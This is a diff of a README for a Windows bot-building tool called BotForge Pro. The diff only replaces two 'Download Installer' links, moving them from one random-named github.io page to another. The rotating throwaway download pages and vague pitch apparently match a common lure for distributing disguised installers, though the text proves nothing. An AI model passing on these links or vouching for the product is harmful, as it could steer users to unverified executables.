@@ -2,7 +2,7 @@
 
 BotForge Pro Automation Toolkit is a comprehensive solution for bot builders and automation enthusiasts in 2026. This Windows desktop mod/tool simplifies the creation and management of custom bots for platforms like Discord, Telegram, Instagram, and TikTok. Whether you're into gaming bots, automated farming, or multi-platform bot management, this tool provides an advanced panel for all your needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ BotForge currently supports Discord, Telegram, Instagram, TikTok, and Twitter, w
 
 For the most recent version, please visit our official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: 2026-10-15*
 
